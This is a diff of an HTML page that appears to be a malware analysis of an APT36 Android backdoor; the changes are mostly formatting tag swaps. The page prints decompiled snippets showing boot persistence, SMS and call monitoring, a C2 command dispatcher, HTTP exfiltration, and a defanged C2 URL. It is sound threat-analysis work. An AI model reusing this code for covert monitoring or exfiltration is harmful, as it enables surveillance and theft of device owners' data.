@@ -186,7 +186,7 @@ ___________________________________________________________________</pre>
 
     <p>The above defnies the following Android device permission constants (android.permission.*):</p>
     
-       <pre class="hack dark"><i>
+       <pre class="hack dark"><code>
 .ACCESS_NETWORK_STATE                [ACCESS NETWORK INFORMATION, Wi-Fi, GSM, GPRS, UMTS ETC]
 .WRITE_EXTERNAL_STORAGE              [WRITE TO DEVICE EXTERNAL STORAGE] 
 .ACCESS_WIFI_STATE.                  [ACCESS WIFI NETWORK INFORMATION]
@@ -207,28 +207,28 @@ ___________________________________________________________________</pre>
 .VIBRATE                             [ACCESS TO THE DEVICE DC MOTOR THAT CREATES VIBRATION]
 .READ_CALL_LOG                       [READ DEVICE OWNER'S CALL LOG]
 .CLEAR_APP_CACHE                     [CLEAR CACHE OF ALL INSTALLED APKs]
-</i>
+</code>
 </pre>
     
     <p>The sample's entry point is defined within the manifest via the `android.intent.action.MAIN` Intent:</p>
     
-           <pre class="hack dark"><i>
+           <pre class="hack dark"><code>
 android.intent.action.MAIN on com.example.redcated.redacted.MainActivity
-</i>
+</code>
 </pre>
     
     <p>The sample's manifest defines the registered device broadcast recievers to be used for malicious intent:</p>
     
-           <pre class="hack dark"><i>
+           <pre class="hack dark"><code>
 android.intent.action.BOOT_COMPLETED         [ON BOOT COMPLETE EVENT USED FOR MALWARE PERSISTENCE]
 android.provider.Telephony.SMS_RECEIVED      [RECEIVER FOR DEVICE SMS MONITORING]
 android.intent.action.PHONE_STATE.           [RECEIVER FOR DEVICE PHONE CALL MONITORING]
-</i>
+</code>
 </pre>
     
     <p>After decompiling the sample's DEX (Dalvik bytecode), SMALi/baksmali to readable JAVA/Kotlin classes; the entry point, being, the `MainActivity` class defined by `android.intent.action.MAIN` is seen to contain an `onCreate()` method invoking another class, being `CMDService` class, of which, is also invoked via the `onResume()` and `onStart()` method within the same `MainActivity` class. The following represents the `onCreate()` method which is immediatley called by Android's javac/kotlinc compiler and executed on the JVM: 
       
-          <pre class="hack dark"><i>
+          <pre class="hack dark"><code>
   protected void onCreate(android.os.Bundle p9) {
     super.onCreate(p9);
     Maybe([ARRAY, OBJECT]) v7_0 = new android.content.Intent(v3_1);
@@ -237,12 +237,12 @@ android.intent.action.PHONE_STATE.           [RECEIVER FOR DEVICE PHONE CALL MON
     this.startService(v3_2);
     return;
   }
-</i>
+</code>
 </pre>
       
       Following the callback to the `CMDService` class defined within the above `onCreate()` method, we can see the sample defines Command and Control (C2) capabilities as well as instantiates programmatic `IF/ELSE`, `CASE/SWITCH` conditional statement for C2 flow. These C2 clauses execute depending on the input recieved by the remote C2 server that in the control of APT36. Note; the below class has been truncated for brevity, while still highlighting a portion of the sample's backdoor capabilities:</p>
 
-    <pre class="hack dark"><i>
+    <pre class="hack dark"><code>
   public constructor com.example.redacted.redacted.CMDService() {
     Maybe([ARRAY, OBJECT]) v5_0 = new com.example.redacted.redacted.fileUpload(v2_0);
     Maybe([ARRAY, OBJECT]) v2_1 = v5_0;
@@ -861,12 +861,12 @@ android.intent.action.PHONE_STATE.           [RECEIVER FOR DEVICE PHONE CALL MON
       v6_8.printStackTrace();
       return;
     }
-</i>
+</code>
 </pre>
     
     <p>In addition to the above, the sample contains a `CallMonitor` class and a `SMSMonitor` class, these classes are associated with registered broadcast recievers permiting real-time monitoring of inbound phone calls and SMS messages. Both of these receivers define a HTTP asynchronous task containing callbacks to another class titled `setting`. This `setting` class defines the adversary's remote C2 within the `webUrl` parameter and is leveraged for C2 input alongside data exfiltration mechanics from data extracted from the device. The nested CallMonitor$HttpAsyncTask class ilustrates this below:</p>
     
-    <pre class="hack dark"><i>
+    <pre class="hack dark"><code>
 public class com.example.redacted.redacted.CallMonitor$HttpAsyncTask extends android.os.AsyncTask {
   final synthetic com.example.redacted.redacted.CallMonitor this$0;
 
@@ -886,11 +886,11 @@ public class com.example.redacted.redacted.CallMonitor$HttpAsyncTask extends and
     return v3_1.POST(p8[0]);
   }
 }
-</i>
+</code>
 </pre>
-         <p>The above contains `v14_2.<init>(com.example.appcode.appcode.setting.weburl);`, a callback to the `setting` class where webUrl, a parameter assigned with a hard-coded value, is defined. This value is the malware sample's remote C2 server, of which, is used to transmit dynamic commands from APT36 to the compromised device (command execution), as well as, exfiltrate device data over an outbound HTTP socket:</p>
+         <p>The above contains <pre><code>`v14_2.<init>(com.example.appcode.appcode.setting.weburl);`</pre></code>, a callback to the `setting` class where webUrl, a parameter assigned with a hard-coded value, is defined. This value is the malware sample's remote C2 server, of which, is used to transmit dynamic commands from APT36 to the compromised device (command execution), as well as, exfiltrate device data over an outbound HTTP socket:</p>
      
-     <pre class="hack dark"><i>
+     <pre class="hack dark"><code>
 static {
     com.example.redacted.redacted.setting.verion = "1.0.0.0";
     com.example.redacted.redacted.setting.webUrl = "http[:]//android[.]viral91[.]xyz/admin/webservices";   
@@ -899,7 +899,7 @@ static {
     com.example.redacted.redacted.setting.os = "";
     com.example.redacted.redacted.setting.ip = "";
     com.example.redacted.redacted.setting.userID = 0;
-</i>
+</code>
 </pre>
     <p>FINAL COMMENTS ON SAMPLE X AND CONCLUSION</p>
      
